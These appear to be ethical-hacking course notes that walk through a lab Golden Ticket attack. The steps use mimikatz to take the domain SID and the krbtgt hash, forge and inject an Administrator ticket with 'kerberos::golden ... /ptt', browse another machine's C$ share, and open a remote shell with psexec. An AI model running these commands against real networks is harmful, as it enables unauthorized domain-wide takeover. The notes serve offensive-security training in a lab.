# III. Golden Ticket Attacks

Login to Windows Server machine as Administrator. Move mimikatz to the Downloads folder.

Open the Command line, move to the location we saved mimikatz , and run it.

![gold1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/a50abe09-2710-475c-b86d-6805ee5bde2e)

Copy the SID of the domain:

![gold2](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/042fdb07-0c0f-44c1-b9d1-b4dc66bfb869)

And the NTLM hash of the krbtgt account:

![gold3](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/ca3a8290-cd92-41c6-9325-ca444f4f0da0)

Paste them into a notepad. These will allow us to generate our golden ticket.

Next we type in the following command to generate the golden ticket:

`kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt`

NOTE: The Administrator account has an RID (Relative Identifier) of 500 and `ptt` stands for pass the ticket. This allow use to pass the ticket to the next session to open a command prompt to access any computer we want.

![gold4](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/a9ad07de-d77d-447c-9d2f-df63e9378ad3)

Done!

Next, start a new command prompt with `misc::cmd`. Type in `dir \\UserMachine\c$`(If it doesn’t work, try using the IP address instead).

We’ve accessed the directory of the `FRANKY` machine.

![gold5](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/ea84a086-e59f-483b-9f82-818d544d0473)


We can take this a step further by using `psexec` and using it against the user machine to get a shell. 

E.g. `psexec.exe \\UserMachine cmd.exe`

![gold6](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/23887805-d4f2-4190-a71f-f5a9caa16530)
